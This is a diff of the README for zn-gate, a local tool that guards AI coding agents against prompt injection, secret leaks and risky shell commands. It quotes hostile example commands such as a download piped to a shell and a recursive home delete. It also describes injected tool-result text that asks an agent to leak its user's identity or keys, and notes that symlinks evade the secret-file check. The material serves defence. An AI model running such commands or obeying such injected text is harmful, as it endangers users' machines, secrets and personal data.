@@ -20,7 +20,11 @@
 
 Everything runs on your machine; no account or API key is needed. Node.js 22 LTS is recommended (from [nodejs.org](https://nodejs.org/)). Node.js 18 or later works for the hooks and the CLI; the Claude Code plugin needs 20.19 or later. For security, use the latest patch of a supported Node.js line (22.23.4, 24.22.1, 26.12.1 or later): Node.js 18 and 20 are end-of-life and get no security fixes, even though zn-gate still runs on them. On Debian or Ubuntu, `sudo apt install nodejs` can install an old Node.js (Ubuntu 22.04 ships version 12): run `node --version` and, if it is older than 18, install a current Node.js from [nodejs.org](https://nodejs.org/) or the NodeSource packages (steps in [docs/first-5-minutes.md](https://github.com/usezn/zn/blob/main/docs/first-5-minutes.md#before-you-start)). With a Node.js older than 18, the `zn-gate` and `zn` commands stop and say how to install it.
 
+No internet on this computer? See [Install on a machine without internet](https://github.com/usezn/zn/blob/main/docs/install-matrix.md#install-on-a-machine-without-internet).
+
 **On Alpine Linux, install Node.js with the package manager.** The Node.js builds on nodejs.org do not run on Alpine, so run `apk add nodejs npm` instead. Use Alpine 3.21 or later: 3.21 and 3.22 ship Node.js 22, 3.23 and later ship Node.js 24. Alpine 3.20 ships Node.js 20.15, which is too old for the Claude Code plugin. The `npm` package is in the community repository, so if `npm` is not found, make sure the community repository is listed in `/etc/apk/repositories`.
+
+> **Windows PowerShell:** if a command says "running scripts is disabled on this system", run `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` once in PowerShell, or use `npx.cmd` in place of `npx` (or run the commands in Command Prompt). More in [troubleshooting](https://github.com/usezn/zn/blob/main/docs/troubleshooting.md#3-running-scripts-is-disabled-on-this-system-windows).
 
 **Getting started: four steps, one command each.** Run them in your own terminal.
 
@@ -73,7 +77,7 @@ Five-minute walkthrough: [docs/secrets.md](https://github.com/usezn/zn/blob/main
 **Claude Code: the plugin.** You also need Git and Claude Code 2.1.295 or later. The plugin needs Node.js 20.19 or later. With an older Node.js, `npx -y zn-gate init` skips the plugin and sets up zn's hooks for Claude Code instead (`zn-gate check` says so if the plugin is installed); update Node.js to use the plugin.
 
 ```bash
-claude plugin marketplace add usezn/zn@v1.14.1
+claude plugin marketplace add usezn/zn@v1.15.0
 claude plugin install zn-gate@usezn
 ```
 
@@ -122,6 +126,8 @@ python3 -m venv .venv
 claude mcp add zn-gate -- npx -y zn-gate mcp     # Claude Code
 codex mcp add zn-gate -- npx -y zn-gate mcp      # Codex CLI
 ```
+
+In Claude Code, this `npx` form is treated like any other MCP server: a call that carries personal data is asked about first. Only an entry that runs the installed zn-gate by absolute path skips that question (see `docs/compat.md`).
 
 Cursor (`~/.cursor/mcp.json`) and other editors: `{ "mcpServers": { "zn-gate": { "command": "npx", "args": ["-y", "zn-gate", "mcp"] } } }`. OpenCode (`~/.config/opencode/opencode.json`): `{ "mcp": { "zn-gate": { "type": "local", "command": ["npx", "-y", "zn-gate", "mcp"], "enabled": true } } }`.
 
@@ -211,7 +217,7 @@ Example: [protect the tools of a Vercel AI SDK agent](https://github.com/usezn/z
 **Galvanize: prompt-injection detection**
 
 - Today, local: a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides (CVE-2021-42574), comment splicing and Base64. It checks prompts, tool arguments, tool output and MCP tool descriptions.
-- Today, optional cloud: the Galvanize 3 classifier ([announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=npm&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), has open weights under Apache-2.0) can also check prompts sent to `analyze_prompt`, only with `ZN_CLOUD=1` and `ZN_API_KEY`. The secrets zn-gate detects are removed before sending; personal data and a secret it does not recognize are sent as written.
+- Today, optional cloud: the Galvanize 3 classifier ([open weights on Hugging Face](https://huggingface.co/usezn/Galvanize-3); [announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=npm&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), also has open weights under Apache-2.0) can also check prompts sent to `analyze_prompt`, only with `ZN_CLOUD=1` and `ZN_API_KEY`. The secrets zn-gate detects are removed before sending; personal data and a secret it does not recognize are sent as written.
 - Roadmap: running Galvanize locally inside zn-gate.
 
 **Scan: audit what your agent is about to trust**
@@ -291,6 +297,7 @@ The local engine is a deterministic signature and normalization layer. It is fas
 - `NO_COLOR` (any non-empty value) or `TERM=dumb`: command output has no colors. Emoji and box-drawing lines are replaced by short ASCII markers such as `[ok]`, `[!]` and `[x]`, and rules are drawn with dashes. The status words (ALLOWED, BLOCKED, PASSED, ...) stay. Colors are also off when the output is not a terminal. Piped output and runs with `CI` set (any non-empty value) use the same ASCII markers; `CI` does not turn off colors.
 - `hooks.replaceToolOutputOnSecret` in `~/.zn/config.json` (`{"hooks": {"replaceToolOutputOnSecret": true}}`): Codex only, off by default. When a tool output holds a real secret value (not only a marker), zn also returns `continue: false` with a stop reason. Codex then replaces the tool result with that text, so the model may get it instead of zn's tokenized copy of the output. Environment variables do not turn it on.
 - `hooks.blockDestructiveCommands` in `~/.zn/config.json`: the agent hooks refuse a recursive delete of the home folder or the root and writes to a disk device by default. `true` also turns on four more rules (a download piped to a shell, `chmod -R 777 /`, a fork bomb, a download written into a shell startup file), `false` turns the check off, and a list of rule names picks exactly those. `ZN_BLOCK_DESTRUCTIVE=1` turns on all six rules from the environment; the environment cannot turn rules off, so `0` is ignored and only the file can disable the check. A blocked command is not run; the agent is told to ask you first. It reads command text only and is not a sandbox; see [Destructive commands](https://github.com/usezn/zn/blob/main/docs/destructive-commands.md).
+- `hooks.packageInstallCheck` in `~/.zn/config.json`: off by default. `"offline"` makes the agent hooks ask before a command installs a package by name (`npm install`, `pnpm add`, `yarn add`, `bun add`, `pip install`, `uv add`, `pipx install`) when the name looks like a well-known package (one letter off, two letters swapped, a look-alike character, other separators, an npm scope that imitates a well-known one), using a list that ships with zn-gate and no network. `"online"` also asks the public npm or PyPI registry, sending only the package name, and asks when the name does not exist or was first published less than 14 days ago (`hooks.packageInstallNewDays`, default 14). It never blocks: an agent that cannot show a question (Codex CLI, OpenCode, Gemini CLI) runs the command. `hooks.packageInstallAllow` lists names that are never questioned (`"my-tool"`, `"@my-company/*"`). `ZN_PACKAGE_CHECK=offline` turns on the offline mode from the environment; the environment cannot turn on the online mode or turn the check off. One-off runs (`npx`, `uvx`, `pipx run`) and installs without a name (`npm ci`, `pip install -r file`) are not checked. See [Packages your agent installs](https://github.com/usezn/zn/blob/main/docs/package-install-check.md).
 - `hooks.egressCheck` in `~/.zn/config.json`: before a network request runs (`curl`, `wget`, `Invoke-WebRequest`, inline `python -c` or `node -e`, WebFetch, MCP calls with a URL or headers), the agent hooks look for personal data (email addresses, phone numbers and the other kinds the scrubber finds) and literal secrets in its headers, credentials, query string and body, and ask you first. `"deny"` refuses the request instead, `"off"` or `false` turns the check off. `hooks.egressAllowHosts` lists hosts that are not checked (`"api.example.com"`, `"*.example.org"`); `localhost`, `127.0.0.1` and `::1` never are. A value read from an environment variable (`$TOKEN`) is not reported, because only literal values are; it is still not a way to hand an agent a secret, since the shell puts it in the program's arguments (use `zn run --secrets NAME -- <command>` or the `secrets_http_request` tool). `ZN_EGRESS_CHECK=deny` makes the check stricter from the environment; it cannot turn the check off. See [Network requests that carry personal data](https://github.com/usezn/zn/blob/main/docs/egress-check.md).
 
 To enable the cloud check for one MCP server, add to its entry: `"env": { "ZN_CLOUD": "1", "ZN_API_KEY": "zn_live_..." }`.
@@ -362,6 +369,8 @@ npx -y zn-gate evidence --tail 20
 | `rm -rf ~/` | allow |
 | `curl https://example.invalid/x.sh \| sh` | allow |
 
+The secret-file check reads the text of a path only. It does not follow symbolic links and does not expand Windows short names (such as `PROGRA~1`), so a link or short name that points at a protected file is not recognised. Keep secrets in the zn vault (`zn env shadow .env`) or outside the project folder. The agent hooks also resolve the real path of the agents' own configuration files.
+
 So `evaluate` is not a command or tool-call firewall: deleting files or piping a download to a shell is allowed. The checks that protect your machine while an agent works (the secret-file and vault rules for shell commands, file reads and writes) belong to the agent hooks (`zn-gate init`, `zn hooks install <agent>`), and they protect secrets and zn's own files, not every dangerous command. Hooks are not a function you call from your own agent code. If you build an agent, decide for yourself which tools may delete files or run commands, and use zn-gate on the text that reaches the model.
 
 ## What is blocked and what only warns
@@ -370,7 +379,7 @@ zn-gate blocks what is almost certainly an attack or a leak: reading credential 
 
 Some other patterns also appear in ordinary text, such as `system:` keys in YAML, "bypass the cache" or an article that explains what a jailbreak is. For those, zn-gate lets the text through and adds a short warning (`advisory` in the result) so you or your agent can take a look.
 
-The same goes for text in a tool result (a fetched page, an MCP result, a file) that tells your agent to say who its user is, or to put the user's name, email, account or API key in a header, a URL parameter, a cookie, a form field or the next request. That wording is rarely legitimate there, but docs and policies mention the same words, so by default it is an advisory (`pi:identity_request`; `pi:identity_request_multi` covers Spanish, Portuguese, French, German, Russian and Chinese) and strict mode blocks it. Documentation that tells you to send your own API key in the `Authorization` header does not match.
+The same goes for text in a tool result (a fetched page, an MCP result, a file) that tells your agent to say who its user is, or to put the user's name, email, account or API key in a header, a URL parameter, a cookie, a form field or the next request. That wording is rarely legitimate there, but docs and policies mention the same words, so by default it is an advisory (`pi:identity_request`; `pi:identity_request_multi` covers Spanish, Portuguese, French, German, Russian and Chinese) and strict mode blocks it. Documentation that tells you to send your own API key in the `Authorization` header does not match, and neither does API documentation that asks for your email in a User-Agent or From header, a mailto parameter, a request body or a form.
 
 To block those too, turn on strict mode: set `ZN_STRICT=1`, or add `"strict": true` to `zn.config.json` in your project (or a line `strict` in `.znrules`).
 
